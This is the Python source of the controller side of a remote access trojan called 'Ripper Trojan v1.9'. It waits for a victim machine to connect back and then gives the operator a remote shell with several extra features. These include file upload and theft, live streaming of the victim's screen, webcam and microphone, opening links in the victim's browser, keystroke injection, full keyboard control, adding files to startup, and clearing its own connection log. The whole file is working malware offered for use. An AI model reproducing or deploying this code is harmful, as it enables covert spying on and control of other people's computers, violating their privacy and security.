from pynput.keyboard import Key, Listener;
from vidstream import StreamingServer;
from vidstream import AudioReceiver;
from datetime import datetime;
import socket, os, sys, time;

banner1 = '''
  ██▀███   ██▓ ██▓███   ██▓███  ▓█████  ██▀███  
▓██ ▒ ██▒▓██▒▓██░  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
▒██▀▀█▄  ░██░▒██▄█▓▒ ▒▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  
░██▓ ▒██▒░██░▒██▒ ░  ░▒██▒ ░  ░░▒████▒░██▓ ▒██▒
░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ░▒ ░ ▒░ ▒ ░░▒ ░     ░▒ ░      ░ ░  ░  ░▒ ░ ▒░
  ░░   ░  ▒ ░░░       ░░          ░     ░░   ░ 
   ░      ░                       ░  ░   ░     

    [RIPPER] Connected to target !
    
            ''';

banner0 = '''
    .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '

                Ripper Trojan v1.9 | By: __Drako__ | © 2021
                 
        ''';

print(banner0);
def connect():
    portl = input('[RIPPER] listen port:> ');
    if os.name == 'nt':
        os.system("cls");
    else:
        os.system("clear");
    print(banner0);
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    global addr;
    addr = ('', int(portl));
    s.bind(addr);
    s.listen(10);
    print(f'[RIPPER] Waiting Target Connection !');
    conn, addr = s.accept();
    r = conn.recv(5120).decode('utf-8', errors='ignore');
    cwd = 'Shell';
    if os.name == 'nt':
        os.system("cls");
    else:
        os.system("clear");
    log = open('ripperlog.log', 'a');
    now = datetime.now();
    date = f"{now.hour}:{now.minute}:{now.second} {now.strftime('%d/%m/%Y')}";
    log.write(f'\n[RIPPER] {addr[0]}:{portl} Connection | {date}');
    log.close();
    print(banner1);
    if 'dir:' in r:
        cwd = r[4:];
    while True:
        command = input('[RIPPER] ' + str(cwd) + ":> ");
        if command == 'clear':
            os.system('cls');
            print(banner1);
        elif 'send' in command:
            conn.send(command.encode('utf-8'));
            file_name = command[5:];
            file_size = os.path.getsize(file_name);
            conn.send(file_name.encode('utf-8'));
            print(conn.recv(1024).decode('utf-8'));
            print("[RIPPER] Waiting target response");
            conn.send(str(file_size).encode('utf-8'));
            print(conn.recv(1024).decode('utf-8'));
            print("[RIPPER] Transfering [" + str(file_size/1024) + "] Kb");
            with open(file_name, "rb") as file:
                c = 0;
                start_time = time.time();
                while c < int(file_size):
                    data = file.read(1024);
                    if not (data):
                        break;
                    conn.sendall(data);
                    c += len(data);
                end_time = time.time();
                print("[RIPPER] File transferede with sucess: ", end_time - start_time);
        elif 'get' in command:
              conn.send(command.encode('utf-8'));
              file_name = conn.recv(1024).decode('utf-8');
              print('[RIPPER] Connection: OK');
              file_size = conn.recv(1024).decode('utf-8');
              print('[RIPPER] Starting transference: OK');
              with open(file_name, "wb") as file:
                    c = 0
                    start_time = time.time();
                    while c < int(file_size):
                        data = conn.recv(1024);
                        if not (data):
                            break;
                        file.write(data);
                        c += len(data);
                    end_time = time.time();
                    print("[RIPPER] File transferede with sucess: ", end_time - start_time);
              pass;
              continue;
        elif 'screen' in command:
            conn.send(command.encode('utf-8'));
            server = StreamingServer('', 9999);
            server.start_server();
            print(conn.recv(1024).decode('utf-8'));
            continue;
        elif 'cam' in command:
            conn.send(command.encode('utf-8'));
            server2 = StreamingServer('', 9998);
            server2.start_server();
            print(conn.recv(1024).decode('utf-8'));
            continue;
        elif 'mic' in command:
            conn.send(command.encode('utf-8'));
            server3 = AudioReceiver('', 9997);
            server3.start_server();
            print(conn.recv(1024).decode('utf-8'));
            continue;
        elif 'stop st' in command:
            try:
                server.stop_server();
                server2.stop_server();
                server3.stop_server();
            except Exception:
                pass;
            print('[RIPPER]  Options were disabled');
            continue;
        elif 'open link' in command:
            command = f'{command}'
            conn.send(command.encode('utf-8'));
            print(conn.recv(1024).decode('utf-8'));
            continue;
        elif 'clear log' in command:
            log = open('ripperlog.log', 'w');
            log.write(' ');
            log.close();
            print('[RIPPER] Log cleaned with sucess');
            continue;
        elif 'keyboard type' in command:
            conn.send(command.encode('utf-8'));
            print(conn.recv(1024).decode('utf-8'));
            continue;
        elif 'keyboard control' in command:
            conn.send(command.encode('utf-8'));
            print(conn.recv(1024).decode('utf-8'));
            global stop;
            stop = 0;
            def on_press(key):
                if key == Key.insert:
                    listener.stop();
                    conn.send(f'stop'.encode('utf-8'));
                else:    
                    conn.send(f'{key}'.encode('utf-8'));
            with Listener(on_press=on_press) as listener:
                    listener.join();
            continue;
        elif 'quit' in command:
            break;
            continue;
        elif 'rhelp' in command:
            print('''
                    1. send <file name> --> send files to target computer.
                    2. get <file name> --> download files from the target's computer.
                    3. screen --> show the target screen.
                    4. cam --> show the target cam.
                    5. stop st --> stop, screen and cam.
                    6. clear --> clear the console.
                    7. mic --> listen to the audio from the target's microphone.
                    8. open link <link> --> opens a link in the target's browser.
                    9. clear log --> clear the log file.
                    10. terminate --> close the connection.
                    11. startup <file name> --> add a file at startup.
                    12. keyborad type <text> --> type a text on the target's computer keyboard.
                    13. keyboard control --> controls target keyboard.
                    14. quit --> ends the program.
                    15. rhelp --> show this message.
                  ''');
            continue;
        conn.send(command.encode('utf-8', errors='ignore'));
        r = conn.recv(5120).decode('utf-8', errors='ignore');
        if 'dir:' in r:
            cwd = r[4:];
        if r.startswith('dir: ') or r.startswith("'clear' "):
            pass;
        else:
            print(r);
connect();
